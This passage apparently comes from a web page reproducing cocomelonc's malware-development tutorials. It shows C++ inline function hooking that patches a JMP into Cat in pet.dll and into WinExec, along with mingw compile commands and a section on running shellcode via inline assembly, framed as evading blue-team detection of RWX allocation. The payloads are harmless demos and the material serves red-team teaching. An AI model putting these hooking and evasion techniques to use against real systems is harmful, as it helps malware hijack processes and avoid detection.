+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-python">/*
+hooking.cpp
+basic hooking example
+author: @cocomelonc
+https://cocomelonc.github.io/tutorial/
+2021/11/30/basic-hooking-1.html
+*/
+#include &lt;windows.h&gt;
+typedef int (__cdecl *CatProc)(LPCTSTR say);
+
+// buffer for saving original bytes
+char originalBytes[5];
+FARPROC hookedAddress;
+// we will jump to after the hook has been installed
+int __stdcall myFunc(LPCTSTR say) {
+HINSTANCE petDll;
+CatProc catFunc;
+// unhook the function: rewrite original bytes
+WriteProcessMemory(GetCurrentProcess(),
+(LPVOID)hookedAddress,
+originalBytes, 5, NULL);
+// return to the original function and modify the text
+petDll = LoadLibrary("pet.dll");
+catFunc = (CatProc) GetProcAddress(petDll, "Cat");
+return (catFunc) ("meow-squeak-tweet!!!");
+}
+// hooking logic
+void setMySuperHook() {
+HINSTANCE hLib;
+VOID *myFuncAddress;
+DWORD *rOffset;
+DWORD src;
+DWORD dst;
+CHAR patch[5]= {0};
+// get memory address of function Cat
+hLib = LoadLibraryA("pet.dll");
+hookedAddress = GetProcAddress(hLib, "Cat");
+// save the first 5 bytes into originalBytes (buffer)
+ReadProcessMemory(GetCurrentProcess(),
+(LPCVOID) hookedAddress,
+originalBytes, 5, NULL);
+// overwrite the first 5 bytes with a jump to myFunc
+myFuncAddress = &amp;myFunc;
+// will jump from the next instruction
+// (after our 5 byte jmp instruction)
+src = (DWORD)hookedAddress + 5;
+
+dst = (DWORD)myFuncAddress;
+rOffset = (DWORD *)(dst-src);
+// \xE9 - jump instruction
+memcpy(patch, "\xE9", 1);
+memcpy(patch + 1, &amp;rOffset, 4);
+WriteProcessMemory(GetCurrentProcess(),
+(LPVOID)hookedAddress, patch,
+5, NULL);
+}
+int main() {
+HINSTANCE petDll;
+CatProc catFunc;
+petDll = LoadLibrary("pet.dll");
+catFunc = (CatProc) GetProcAddress(petDll, "Cat");
+// call original Cat function
+(catFunc)("meow-meow");
+// install hook
+setMySuperHook();
+// call Cat function after install hook
+(catFunc)("meow-meow");
+}</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to compile this: x86_64-w64-mingw32-g++ -O2 hooking.cpp -o hooking.exe \ -mconsole -I/usr/share/mingw-w64/include/ -s \ -ffunction-sections -fdata-sections -Wno-write-strings \ -fno-exceptions -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And see it in action (on Windows 7 x64 in this case): .\hooking.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see our hook is worked perfectly!! Cat goes meow-squeak-tweet!!! instead meow-meow!</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">example 2 Similarly, you can hook for example, a function WinExec from kernel32.dll (hooking2.cpp):</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">#include &lt;windows.h&gt;
+// buffer for saving original bytes
+char originalBytes[5];
+FARPROC hookedAddress;
+// we will jump to after the hook has been installed
+int __stdcall myFunc(LPCSTR lpCmdLine, UINT uCmdShow) {
+// unhook the function: rewrite original bytes
+WriteProcessMemory(GetCurrentProcess(),
+(LPVOID)hookedAddress, originalBytes, 5, NULL);
+// return to the original function and modify the text
+return WinExec("calc", uCmdShow);
+}
+// hooking logic
+void setMySuperHook() {
+HINSTANCE hLib;
+VOID *myFuncAddress;
+DWORD *rOffset;
+DWORD src;
+DWORD dst;
+CHAR patch[5]= {0};
+// get memory address of function MessageBoxA
+hLib = LoadLibraryA("kernel32.dll");
+hookedAddress = GetProcAddress(hLib, "WinExec");
+// save the first 5 bytes into originalBytes (buffer)
+ReadProcessMemory(GetCurrentProcess(),
+(LPCVOID) hookedAddress, originalBytes, 5, NULL);
+// overwrite the first 5 bytes with a jump to myFunc
+myFuncAddress = &amp;myFunc;
+// will jump from the next instruction
+// (after our 5 byte jmp instruction)
+src = (DWORD)hookedAddress + 5;
+
+dst = (DWORD)myFuncAddress;
+rOffset = (DWORD *)(dst-src);
+// \xE9 - jump instruction
+memcpy(patch, "\xE9", 1);
+memcpy(patch + 1, &amp;rOffset, 4);
+WriteProcessMemory(GetCurrentProcess(),
+(LPVOID)hookedAddress, patch, 5, NULL);
+}
+int main() {
+// call original
+WinExec("notepad", SW_SHOWDEFAULT);
+// install hook
+setMySuperHook();
+// call after install hook
+WinExec("notepad", SW_SHOWDEFAULT);
+}
+Let’s go to compile:
+x86_64-w64-mingw32-g++ -O2 hooking2.cpp -o hooking2.exe \
+-mconsole -I/usr/share/mingw-w64/include/ -s \
+-ffunction-sections -fdata-sections -Wno-write-strings \
+-fno-exceptions -fmerge-all-constants -static-libstdc++ \
+-static-libgcc -fpermissive
+
+and run:
+.\hooking2.exe
+
+So everything worked as expected.
+Source code in Github
+MessageBox
+WinExec
+Exporting from DLL using __declspec
+
+20. run shellcode via inline ASM. Simple C++ example.
+
+
+This is a very short section and it describes an example usage inline assembly for running
+shellcode in malware.</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s take a look at example C++ source code of our malware:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+hack.cpp
+code inject via inline ASM
+author: @cocomelonc
+https://cocomelonc.github.io/tutorial/
+2021/12/03/inline-asm-1.html
+*/
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+int main() {
+printf("=^..^= meow-meow. You are hacked =^..^=\n");
+asm(".byte 0x90,0x90,0x90,0x90\n\t"
+"ret \n\t");
+return 0;
+}
+As you can see, the logic is simplest, I’m just adding 4 NOP instructions and printing
+meow-meow string before. I can easily find the shellcode in the debugger based on this
+meow string:
+
+Let’s go to compile:
+x86_64-w64-mingw32-g++ hack.cpp -o hack.exe \
+-mconsole -fpermissive
+
+And run in x96dbg (on Windows 7 x64 in my case):
+
+As you can see, the highlighted instructions are my NOP instructions, so everything
+work perfectly as expected.
+The reason why it’s good to have this technique in your arsenal is because it does
+
+not require you to allocate new RWX memory to copy your shellcode over to by using VirtualAlloc which is more popular and suspicious and which is more closely
+investigated by the blue teamers.
+I hope this post spreads awareness to the blue teamers of this interesting technique, and
+adds a weapon to the red teamers arsenal.
+inline assembly
+source code in Github</code></pre>
+            </div></main></body></html>
